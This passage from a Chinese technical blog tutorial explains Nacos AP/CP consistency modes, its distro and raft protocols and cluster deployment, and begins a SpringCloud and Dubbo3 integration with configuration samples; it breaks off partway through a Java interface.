<p>CAP原则的精髓就是要么AP，要么CP，要么AC，但是不存在CAP。如果在某个分布式系统中数据无副本， 那么系统必然满足强一致性条件， 因为只有独一数据，不会出现数据不一致的情况，此时C和P两要素具备，但是如果系统发生了网络分区状况或者宕机，必然导致某些数据不可以访问，此时可用性条件就不能被满足，即在此情况下获得了CP系统，但是CAP不可同时满足 。</p> 
<p>基于CAP理论，在分布式系统中，数据的一致性、服务的可用性和网络分区容忍性只能三者选二。一般来说分布式系统需要支持网络分区容忍性，那么就只能在C和A里选择一个作为系统支持的属性。C 的准确定义应该是所有节点在同一时间看到的数据是一致的，而A的定义是所有的请求都会收到响应。</p> 
<p>Nacos 支持 AP 和 CP 模式的切换，这意味着 Nacos 同时支持两者一致性协议。这样，Nacos能够以一个注册中心管理这些生态的服务。不过在Nacos中，AP模式和CP模式的具体含义，还需要再说明下。</p> 
<p>AP模式为了服务的可能性而减弱了一致性，因此AP模式下只支持注册临时实例。AP 模式是在网络分区下也能够注册实例。在AP模式下也不能编辑服务的元数据等非实例级别的数据，但是允许创建一个默认配置的服务。同时注册实例前不需要进行创建服务的操作，因为这种模式下，服务其实降级成一个简单的字符创标识，不在存储任何属性，会在注册实例的时候自动创建。</p> 
<p>CP模式下则支持注册持久化实例，此时则是以 Raft 协议为集群运行模式，因此网络分区下不能够注册实例，在网络正常情况下，可以编辑服务器别的配置。改模式下注册实例之前必须先注册服务，如果服务不存在，则会返回错误。</p> 
<p>MIXED 模式可能是一种比较让人迷惑的模式，这种模式的设立主要是为了能够同时支持临时实例和持久化实例的注册。这种模式下，注册实例之前必须创建服务，在服务已经存在的前提下，临时实例可以在网络分区的情况下进行注册。</p> 
<h5><a id="Nacos_CPAP_2999"></a>Nacos CP/AP模式设定</h5> 
<p>使用如下请求进行Server运行模式的设定：</p> 
<pre><code class="prism language-bash"><span class="token function">curl</span> -X PUT
<span class="token string">'$NACOS_SERVER:8848/nacos/v1/ns/operator/switches?entry=serverMode&amp;value=CP'</span>
</code></pre> 
<h5><a id="Nacos_CPAP_3010"></a>Nacos CP/AP模式切换</h5> 
<p>Nacos 集群默认支持的是CAP原则中的AP原则.</p> 
<p>但是Nacos 集群可切换为CP原则，切换命令如下：</p> 
<pre><code class="prism language-bash"><span class="token function">curl</span> -X PUT <span class="token string">'$NACOS_SERVER:8848/nacos/v1/ns/operator/switches?entry=serverMode&amp;value=CP'</span>
</code></pre> 
<p>同时微服务的bootstrap.properties 需配置如下选项指明注册为临时/永久实例<br> AP模式不支持数据一致性，所以只支持服务注册的临时实例，CP模式支持服务注册的永久实例，满足配置文件的一致性</p> 
<pre><code class="prism language-properties">#false为永久实例，true表示临时实例开启，注册为临时实例
spring.cloud.nacos.discovery.ephemeral=true
</code></pre> 
<h4><a id="APCP_3032"></a>AP/CP的配套一致性协议</h4> 
<p>介绍一致性模型之前，需要回顾 Nacos 中的两个概念：临时服务和持久化服务。</p> 
<ul><li>临时服务（Ephemeral）：临时服务健康检查失败后会从列表中删除，常用于服务注册发现场景。</li><li>持久化服务（Persistent）：持久化服务健康检查失败后会被标记成不健康，常用于 DNS 场景。</li></ul> 
<p>两种模式使用的是不同的一致性协议：</p> 
<ul><li>临时服务使用的是 Nacos 为服务注册发现场景定制化的私有协议 distro，其一致性模型是 AP；</li><li>而持久化服务使用的是 raft 协议，其一致性模型是 CP。</li></ul> 
<h5><a id="APdistro__3046"></a>AP模式下的distro 协议</h5> 
<p>distro 协议的工作流程如下：</p> 
<ul><li>Nacos 启动时首先从其他远程节点同步全部数据。</li><li>Nacos 每个节点是平等的都可以处理写入请求，同时把新数据同步到其他节点。</li><li>每个节点只负责部分数据，定时发送自己负责数据的校验值到其他节点来保持数据一致性。</li></ul> 
<p>如图所示，每个节点负责一部分服务的写入。</p> 
<p><img src="https://images2.imgbox.com/3a/29/qbUunboD_o.png" alt=""></p> 
<p>但每个节点都可以接收到写入请求，这时就存在两种情况：</p> 
<ul><li>当该节点接收到属于该节点负责的服务时，直接写入。</li><li>当该节点接收到不属于该节点负责的服务时，将在集群内部路由，转发给对应的节点，从而完成写入。</li></ul> 
<p><img src="https://images2.imgbox.com/e0/02/beUn48ob_o.png" alt=""></p> 
<p>读取操作则不需要路由，因为集群中的各个节点会同步服务状态，每个节点都会有一份最新的服务数据。</p> 
<p>而当节点发生宕机后，原本该节点负责的一部分服务的写入任务会转移到其他节点，从而保证 Nacos 集群整体的可用性。</p> 
<p><img src="https://images2.imgbox.com/c0/68/TqmS1Ie7_o.png" alt=""></p> 
<p>一个比较复杂的情况是，节点没有宕机，但是出现了网络分区，即下图所示：</p> 
<p><img src="https://images2.imgbox.com/4d/23/XwcGC7d8_o.png" alt=""></p> 
<p>这个情况会损害可用性，客户端会表现为有时候服务存在有时候服务不存在。</p> 
<p>综上，Nacos 的 distro 一致性协议可以保证在大多数情况下，集群中的机器宕机后依旧不损害整体的可用性。</p> 
<p>Nacos 有两个一致性协议：distro 和 raft，distro 协议不会有脑裂问题。</p> 
<h5><a id="CPraft_3101"></a>CP模式下的raft协议</h5> 
<blockquote> 
 <p>此文还是聚焦于介绍nacos的高可用， raft协议，请参考尼恩的架构师视频。</p> 
</blockquote> 
<h4><a id="_3107"></a>集群内部的特殊的心跳同步服务</h4> 
<p>心跳机制一般广泛存在于分布式通信领域，用于确认存活状态。</p> 
<p>一般心跳请求和普通请求的设计是有差异的，心跳请求一般被设计的足够精简，这样在定时探测时可以尽可能避免性能下降。</p> 
<p>而在 Nacos 中，出于可用性的考虑，一个心跳报文包含了全部的服务信息，这样相比仅仅发送探测信息降低了吞吐量，而提升了可用性，怎么理解呢？</p> 
<p>考虑以下的两种场景：</p> 
<ul><li>nacos-server 节点全部宕机，服务数据全部丢失。nacos-server 即使恢复运作，也无法恢复出服务，而心跳包含全部内容可以在心跳期间就恢复出服务，保证可用性。</li><li>nacos-server 出现网络分区。由于心跳可以创建服务，从而在极端网络故障下，依旧保证基础的可用性。</li></ul> 
<p>调用 OpenApi 依次删除各个服务：</p> 
<pre><code class="prism language-bash"><span class="token function">curl</span> -X <span class="token string">"DELETE mse-xxx-p.nacos-ans.mse.aliyuncs.com:8848/nacos/v1/ns/service?serviceName=providers:com.alibaba.edas.boot.EchoService:1.0.0:DUBBO&amp;groupName=DEFAULT_GROUP"</span>
</code></pre> 
<p>过 5s 后刷新，服务又再次被注册了上来，符合我们对心跳注册服务的预期。</p> 
<h4><a id="_3132"></a>集群部署模式高可用</h4> 
<p>最后给大家分享的 Nacos 高可用特性来自于其部署架构。</p> 
<h5><a id="_3136"></a>节点数量</h5> 
<p>我们知道在生产集群中肯定不能以单机模式运行 Nacos。</p> 
<p>那么第一个问题便是：我应该部署几台机器？</p> 
<p>Nacos 有两个一致性协议：distro 和 raft，distro 协议不会有脑裂问题，所以理论来说，节点数大于等于 2 即可；raft 协议的投票选举机制则建议是 2n+1 个节点。</p> 
<p>综合来看，选择 3 个节点是起码的，其次处于吞吐量和更吞吐量的考量，可以选择 5 个，7 个，甚至 9 个节点的集群。</p> 
<h5><a id="_3146"></a>多可用区部署</h5> 
<p>组成集群的 Nacos 节点，应该尽可能考虑两个因素：</p> 
<ul><li>各个节点之间的网络时延不能很高，否则会影响数据同步。</li><li>各个节点所处机房、可用区应当尽可能分散，以避免单点故障。</li></ul> 
<blockquote> 
 <p>以阿里云的 ECS 为例，选择同一个 Region 的不同可用区就是一个很好的实践。</p> 
</blockquote> 
<h5><a id="_3155"></a>部署模式</h5> 
<p>生产环境，建议使用k8s部署或者阿里云的 ECS 部署。</p> 
<p>考虑的中等公司，都会有运维团队，开发人员不需要参与。</p> 
<p>所以，这里介绍的开发人员必须掌握的，docker模式的部署。</p> 
<h5><a id="nacos_3165"></a>高可用nacos的部署架构</h5> 
<p><img src="https://images2.imgbox.com/89/25/YwFC33Kt_o.png" alt=""></p> 
<h5><a id="nacos_3171"></a>高可用nacos的部署实操</h5> 
<blockquote> 
 <p>实操这块，使用视频介绍更为清晰，请参考尼恩的架构师视频。</p> 
</blockquote> 
<h4><a id="_3177"></a>总结</h4> 
<p>本文从多个角度出发，总结了一下 Nacos 是如何保障高可用的。</p> 
<p>高可用特性绝不是靠服务端多部署几个节点就可以获得的，而是要结合客户端使用方式、服务端部署模式、使用场景综合来考虑的一件事。</p> 
<p>特别是在服务注册发现场景，Nacos 为可用性做了非常多的努力，而这些保障，ZooKeeper 是不一定有的。在做注册中心选型时，可用性保障上，Nacos 绝对是优秀的。</p> 
<h3><a id="SpringCloud_Feign_RPC__3187"></a>SpringCloud Feign 实现RPC 远程调用</h3> 
<p>SpringCloud Feign 作为老牌 RPC 远程调用 组件，很多项目，仍然在使用，</p> 
<p>并且任然是面试的重点</p> 
<p>另外，底层原理都是想通的，大家可以Feign 和 dubbo 对比学习</p> 
<p>SpringCloud Feign 的详细介绍，请阅读 <a href="https://blog.csdn.net/crazymakercircle/article/details/115677785">《Java 高并发核心编程 卷3 加强版》</a></p> 
<h3><a id="SpringCloud__Dubbo_RPC__3199"></a>SpringCloud + Dubbo 实现RPC 远程调用</h3> 
<h4><a id="_3203"></a>大背景：全链路异步化的大趋势来了</h4> 
<p>随着业务的发展，微服务应用的流量越来越大，使用到的资源也越来越多。</p> 
<p>在微服务架构下，大量的应用都是 SpringCloud 分布式架构，这种架构总体上是<strong>全链路同步模式</strong>。</p> 
<p><strong>全链路同步模式</strong>不仅造成了资源的极大浪费，并且在流量发生激增波动的时候，受制于系统资源而无法快速的扩容。</p> 
<p>全球后疫情时代，降本增效是大背景。如何降本增效？</p> 
<p>可以通过技术升级，<strong>全链路同步模式</strong> ，升级为 <strong>全链路异步模式</strong>。</p> 
<p>先回顾一下全链路同步模式架构图</p> 
<p><img src="https://images2.imgbox.com/c0/e0/NZh4ibET_o.png" alt=""></p> 
<p><strong>全链路同步模式</strong> ，如何升级为 <strong>全链路异步模式</strong>， 就是一个一个 环节的异步化。</p> 
<p>40岁老架构师尼恩，持续深化自己的3高架构知识宇宙，当然首先要去完成一次牛逼的<strong>全链路异步模式 微服务实操，下面是尼恩的实操过程、效果、压测数据(性能足足提升10倍多)。</strong></p> 
<p><strong>全链路异步模式</strong>改造 具体的内容，请参考尼恩的深度文章：<a href="https://blog.csdn.net/crazymakercircle/article/details/129004814">全链路异步，让你的 SpringCloud 性能优化10倍+</a></p> 
<p>并且，上面的文章，作为尼恩 全链路异步的架构知识，收录在《<a href="https://blog.csdn.net/crazymakercircle/article/details/124790425">尼恩 Java 面试宝典</a>》V46版的架构专题中</p> 
<blockquote> 
 <p>注：本文以 PDF 持续更新，最新尼恩 架构笔记、面试题 的PDF文件，请从这里获取：<a href="https://gitee.com/crazymaker/SimpleCrayIM/blob/master/%E7%96%AF%E7%8B%82%E5%88%9B%E5%AE%A2%E5%9C%88%E6%80%BB%E7%9B%AE%E5%BD%95.md" rel="nofollow">码云</a></p> 
</blockquote> 
<h4><a id="SpringCloud__Dubbo__RPC__3229"></a>SpringCloud + Dubbo 完成 RPC 异步</h4> 
<p>高并发时代来了， 各大项目有越来越强烈的诉求，全链路异步， 是性能优化的一个杀手锏。</p> 
<p>全链路异步核心环境，就是RPC的异步化。</p> 
<p>使用Dubbo来替换Feign，足足可以提升10倍性能。</p> 
<p>所以，SpringCloud + Dubbo RPC 的集成 是一个比较刚性的需求。</p> 
<p><strong>有小伙伴查招聘网站，发现很多需要有SpringCloud + Dubbo 的集成经验，刚好印证了这点。</strong></p> 
<p>接下来，尼恩一步一步带着大家，来做一下 SpringCloud + Dubbo RPC 的集成实验+性能测试。</p> 
<p>见证一下奇迹： 使用Dubbo 提升10倍的性能。</p> 
<h4><a id="Dubbo3_3247"></a>Dubbo3应用的宏观架构</h4> 
<p>Dubbo3应用架构，如下图所示：</p> 
<p><img src="https://images2.imgbox.com/bb/8f/uw4DFJxE_o.png" alt=""></p> 
<p>从上面的图中，整体的的Dubbo的Rpc框架中，核心的组件有：</p> 
<ul><li>config-center 配置中心，接下来使用 nacos</li><li>Consumer消费端， 业务服务，使用Dubbo SDK 完成服务发现</li><li>Provider服务提供端，业务服务，使用Dubbo SDK 完成服务注册</li><li>Registry注册中心 配置中心，接下来使用 nacos</li></ul> 
<h4><a id="Dubbo3__3262"></a>Dubbo3 应用架构的核心组件</h4> 
<p>两大部分：</p> 
<ul><li>一个Dubbo SDK</li><li>三中心</li></ul> 
<p><strong>Dubbo SDK</strong></p> 
<p>Dubbo SDK作为模块，被微服务所引入和依赖。跟随着微服务组件被部署在分布式集群各个位置，实现各个微服务组件间的协作，主要是服务的注册、服务的发现</p> 
<p><strong>三中心</strong></p> 
<p>Dubbo3包含一些中心化组件，主要有3个，这包括：</p> 
<ul><li>注册中心 
  <ul><li>协调Consumer消费者与Provider服务提供者之间的地址注册与发现。</li></ul> </li><li>配置中心 
  <ul><li>存储Dubbo启动阶段的全局配置，保证配置的跨环境共享与全局一致性</li><li>负责服务治理规则（路由规则、动态配置等）的存储与推送。</li></ul> </li><li>元数据中心 
  <ul><li>接收Provider服务端上报的服务接口元数据，为Admin等控制台提供运维能力（如服务测试、接口文档等）</li><li>作为服务发现机制的补充，提供额外的接口/方法级别配置信息的同步能力，相当于注册中心的额外扩展。</li></ul> </li></ul> 
<p>以上三个中心，由Nacos组件承担，</p> 
<p>所以在下面的实操中，无论dubbo-Provider还是dubbo-consumer，配置文件中都是这么配置的：</p> 
<pre><code class="prism language-yaml"><span class="token key atrule">dubbo</span><span class="token punctuation">:</span>
  <span class="token key atrule">scan</span><span class="token punctuation">:</span>
    <span class="token key atrule">base-packages</span><span class="token punctuation">:</span> com.crazymaker.cloud.dubbo
  <span class="token key atrule">application</span><span class="token punctuation">:</span>
    <span class="token key atrule">name</span><span class="token punctuation">:</span>  $<span class="token punctuation">{<!-- --></span>spring.application.name<span class="token punctuation">}</span>
  <span class="token key atrule">protocol</span><span class="token punctuation">:</span>
    <span class="token key atrule">name</span><span class="token punctuation">:</span> dubbo
    <span class="token key atrule">port</span><span class="token punctuation">:</span> <span class="token number">-1</span>
  <span class="token key atrule">registry</span><span class="token punctuation">:</span>
    <span class="token key atrule">address</span><span class="token punctuation">:</span> nacos<span class="token punctuation">:</span>//$<span class="token punctuation">{<!-- --></span>NACOS_SERVER<span class="token punctuation">:</span>cdh1<span class="token punctuation">:</span><span class="token number">8848</span><span class="token punctuation">}</span>
    <span class="token key atrule">username</span><span class="token punctuation">:</span> nacos
    <span class="token key atrule">password</span><span class="token punctuation">:</span> nacos
    <span class="token key atrule">parameters</span><span class="token punctuation">:</span>
      <span class="token key atrule">namespace</span><span class="token punctuation">:</span> dubbo
      <span class="token key atrule">group</span><span class="token punctuation">:</span> DUBBO_GROUP
  <span class="token key atrule">config-center</span><span class="token punctuation">:</span>
    <span class="token key atrule">address</span><span class="token punctuation">:</span> nacos<span class="token punctuation">:</span>//$<span class="token punctuation">{<!-- --></span>NACOS_SERVER<span class="token punctuation">:</span>cdh1<span class="token punctuation">:</span><span class="token number">8848</span><span class="token punctuation">}</span>
    <span class="token key atrule">username</span><span class="token punctuation">:</span> nacos
    <span class="token key atrule">password</span><span class="token punctuation">:</span> nacos
    <span class="token key atrule">group</span><span class="token punctuation">:</span> DUBBO_GROUP
  <span class="token key atrule">metadata-report</span><span class="token punctuation">:</span>
    <span class="token key atrule">address</span><span class="token punctuation">:</span> nacos<span class="token punctuation">:</span>//$<span class="token punctuation">{<!-- --></span>NACOS_SERVER<span class="token punctuation">:</span>cdh1<span class="token punctuation">:</span><span class="token number">8848</span><span class="token punctuation">}</span>
    <span class="token key atrule">username</span><span class="token punctuation">:</span> nacos
    <span class="token key atrule">password</span><span class="token punctuation">:</span> nacos
    <span class="token key atrule">group</span><span class="token punctuation">:</span> DUBBO_GROUP
</code></pre> 
<h4><a id="SpringBootDubbo30_3320"></a>SpringBoot整合Dubbo3.0基础准备</h4> 
<p>阿里早已把dubbo捐赠给了Apache，现在dubbo由Apache在维护更新，dubbo也已经成了Apache下的顶级项目。</p> 
<h4><a id="SpringCloudNacosDubbo30_3324"></a>SpringCloud+Nacos+Dubbo3.0</h4> 
<h5><a id="_3326"></a>版本说明</h5> 
<ul><li>SpringCloud:<strong>Hoxton.SR8</strong></li><li>SpringCloudAlibaba:<strong>2.2.3.RELEASE</strong></li><li>SpringBoot:<strong>2.3.4.RELEASE</strong></li><li>Nacos:<strong>2.0.3</strong></li><li>Dubbo:<strong>3.0.7</strong></li></ul> 
<h5><a id="_3336"></a>项目结构介绍</h5> 
<h6><a id="1dubbo_3338"></a>1、dubbo的依赖的坐标</h6> 
<p>Maven 依赖的坐标是Apache官方最新的<code>3.0.4</code>坐标。</p> 
<pre><code class="prism language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.apache.dubbo<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>dubbo-bom<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>${dubbo.version}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>type</span><span class="token punctuation">&gt;</span></span>pom<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>type</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>scope</span><span class="token punctuation">&gt;</span></span>import<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>scope</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>
</code></pre> 
<p><img src="https://images2.imgbox.com/5d/98/AIJ2z977_o.png" alt=""></p> 
<p>如果使用的老版本的Dubbo，比如下面的这些依赖， 现在需要去掉啦</p> 
<pre><code class="prism language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>com.alibaba.spring.boot<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>dubbo-spring-boot-starter<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>2.0.0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>io.dubbo.springboot<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>spring-boot-starter-dubbo<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>1.0.0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>
</code></pre> 
<h6><a id="2__3374"></a>2、 注册中心的依赖的坐标</h6> 
<p>老的项目采用zookeeper为注册中心，当然，咱们的电脑里的虚拟机，其实都已经安装好zookeeper服务器，并已经启动。</p> 
<p>所以，如果要使用ZK，对于咱们技术自由圈（疯狂创客圈的新名字）的小伙伴来说，也是非常方便的。</p> 
<p>但是SpringCloud项目上一般使用的注册中，不是appolo，不是eureka，而是nacos。</p> 
<p>现在Dubbo也支持nacos， 所以我们使用Nacos作为注册中心</p> 
<pre><code class="prism language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.apache.dubbo<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>dubbo-registry-nacos<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>${dubbo.version}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>exclusions</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>exclusion</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>com.alibaba.nacos<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>nacos-client<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>exclusion</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>exclusions</span><span class="token punctuation">&gt;</span></span>

    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>type</span><span class="token punctuation">&gt;</span></span>pom<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>type</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>
</code></pre> 
<p>这里有个版本兼容性的bug，尼恩稍微花了一点点时间，才解决这个问题。</p> 
<p>具体的话，视频中给大家详细说一下。</p> 
<h5><a id="SpringBootDubbo30_3406"></a>SpringBoot整合Dubbo3.0大致步骤</h5> 
<ul><li>SpringBoot 项目创建</li><li>Dubbo 服务提供方实现</li><li>Dubbo 服务消费方实现</li><li>自定义Filter拦截所有消费请求</li><li>自定义LoadBalance完成特殊场景负载均衡</li></ul> 
<h5><a id="_3416"></a>模块结构</h5> 
<p>接下来演示下整合的模块结构，注意，是Springcloud 项目的老项目升级，</p> 
<p>不是一个全新的项目，很多老的代码，要复用的</p> 
<p>所以，就是在原来的crazy-SpringCloud 微服务项目上改造</p> 
<p>但是这里仅仅演示 dubbo，所以，在原理的 脚手架里边，增加了两个子模块，</p> 
<p><strong>注意： 模块里边，并没有去掉原来的SpringCloud OpenFeign 的RPC调用, 而是两种RPC 调用共存。</strong></p> 
<p>方便后续在业务中快速运用，完整结构如下：</p> 
<ol><li>consumer，服务消费方模块；</li><li>provider，服务提供方模块；</li><li>统一定义服务接口和实体类，被其他工程模块引用；</li></ol> 
<p>consumer，服务消费方模块\ provider，服务提供方模块；如下图</p> 
<p><img src="https://images2.imgbox.com/1f/ae/9qJxYuoG_o.png" alt=""></p> 
<p>统一定义服务接口和实体类，被其他工程模块引用； 所以，这个之前fegin 的RPC 接口，现在接着给Dubbo用。</p> 
<p><img src="https://images2.imgbox.com/5c/ef/7tvEvBJC_o.png" alt=""></p> 
<h5><a id="Dubbo_3448"></a>Dubbo微服务注册发现的相关配置</h5> 
<ul><li>命名空间隔离</li><li>微服务注册中心配置</li></ul> 
<h5><a id="_3455"></a>命名空间隔离</h5> 
<p>在nacos 的命名空间， 用来做 dubbo 的命名空间隔离</p> 
<p>首先创建nacos的命名空间</p> 
<p><img src="https://images2.imgbox.com/b5/7f/idld4D4I_o.png" alt=""></p> 
<p>命名id 是要用到的， 这里需要填写，</p> 
<p>主要，不要自动生产</p> 
<p><img src="https://images2.imgbox.com/98/3a/RMmnqgdv_o.png" alt=""></p> 
<h4><a id="yml_3473"></a>微服务yml配置</h4> 
<p>微服务 yml 配置， yml配置 dubbo nacos 命名空间</p> 
<pre><code class="prism language-yaml"><span class="token key atrule">dubbo</span><span class="token punctuation">:</span>
  <span class="token key atrule">scan</span><span class="token punctuation">:</span>
	<span class="token key atrule">base-packages</span><span class="token punctuation">:</span> xxx
  <span class="token key atrule">protocol</span><span class="token punctuation">:</span>
    <span class="token key atrule">name</span><span class="token punctuation">:</span> dubbo
    <span class="token key atrule">port</span><span class="token punctuation">:</span> <span class="token number">-1</span>
  <span class="token comment"># 注册中心配置</span>
  <span class="token key atrule">registry</span><span class="token punctuation">:</span>
    <span class="token key atrule">address</span><span class="token punctuation">:</span> nacos<span class="token punctuation">:</span>//xxx
 	<span class="token key atrule">parameters</span><span class="token punctuation">:</span>
   		<span class="token key atrule">namespace</span><span class="token punctuation">:</span> dubbo
    <span class="token key atrule">group</span><span class="token punctuation">:</span> DUBBO_GROUP

<span class="token key atrule">dubbo</span><span class="token punctuation">:</span>
  <span class="token key atrule">application</span><span class="token punctuation">:</span>
    <span class="token key atrule">name</span><span class="token punctuation">:</span>  $<span class="token punctuation">{<!-- --></span>spring.application.name<span class="token punctuation">}</span>
  <span class="token key atrule">protocol</span><span class="token punctuation">:</span>
    <span class="token key atrule">name</span><span class="token punctuation">:</span> dubbo
    <span class="token key atrule">port</span><span class="token punctuation">:</span> <span class="token number">-1</span>
  <span class="token key atrule">registry</span><span class="token punctuation">:</span>
    <span class="token key atrule">address</span><span class="token punctuation">:</span> nacos<span class="token punctuation">:</span>//$<span class="token punctuation">{<!-- --></span>NACOS_SERVER<span class="token punctuation">:</span>cdh1<span class="token punctuation">:</span><span class="token number">8848</span><span class="token punctuation">}</span>
    <span class="token key atrule">username</span><span class="token punctuation">:</span> nacos
    <span class="token key atrule">password</span><span class="token punctuation">:</span> nacos
    <span class="token key atrule">parameters</span><span class="token punctuation">:</span>
      <span class="token key atrule">namespace</span><span class="token punctuation">:</span> dubbo
      <span class="token key atrule">group</span><span class="token punctuation">:</span> DUBBO_GROUP
  <span class="token key atrule">config-center</span><span class="token punctuation">:</span>
    <span class="token key atrule">address</span><span class="token punctuation">:</span> nacos<span class="token punctuation">:</span>//$<span class="token punctuation">{<!-- --></span>NACOS_SERVER<span class="token punctuation">:</span>cdh1<span class="token punctuation">:</span><span class="token number">8848</span><span class="token punctuation">}</span>
    <span class="token key atrule">username</span><span class="token punctuation">:</span> nacos
    <span class="token key atrule">password</span><span class="token punctuation">:</span> nacos
    <span class="token key atrule">group</span><span class="token punctuation">:</span> DUBBO_GROUP
  <span class="token key atrule">metadata-report</span><span class="token punctuation">:</span>
    <span class="token key atrule">address</span><span class="token punctuation">:</span> nacos<span class="token punctuation">:</span>//$<span class="token punctuation">{<!-- --></span>NACOS_SERVER<span class="token punctuation">:</span>cdh1<span class="token punctuation">:</span><span class="token number">8848</span><span class="token punctuation">}</span>
    <span class="token key atrule">username</span><span class="token punctuation">:</span> nacos
    <span class="token key atrule">password</span><span class="token punctuation">:</span> nacos
    <span class="token key atrule">group</span><span class="token punctuation">:</span> DUBBO_GROUP
</code></pre> 
<h4><a id="commonservice__3518"></a>common-service 模块</h4> 
<p>服务接口 进行<strong>利旧</strong> <strong>复用</strong></p> 
<p>还是之前的 UserClient 老接口，open fegn注解都不去掉</p> 
<pre><code class="prism language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>crazymaker<span class="token punctuation">.</span>springcloud<span class="token punctuation">.</span>user<span class="token punctuation">.</span>info<span class="token punctuation">.</span>remote<span class="token punctuation">.</span>client</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>crazymaker<span class="token punctuation">.</span>springcloud<span class="token punctuation">.</span>common<span class="token punctuation">.</span>dto<span class="token punctuation">.</span></span><span class="token class-name">UserDTO</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>crazymaker<span class="token punctuation">.</span>springcloud<span class="token punctuation">.</span>common<span class="token punctuation">.</span>result<span class="token punctuation">.</span></span><span class="token class-name">RestOut</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>crazymaker<span class="token punctuation">.</span>springcloud<span class="token punctuation">.</span>standard<span class="token punctuation">.</span>config<span class="token punctuation">.</span></span><span class="token class-name">FeignConfiguration</span><span class="token punctuation">;</span>
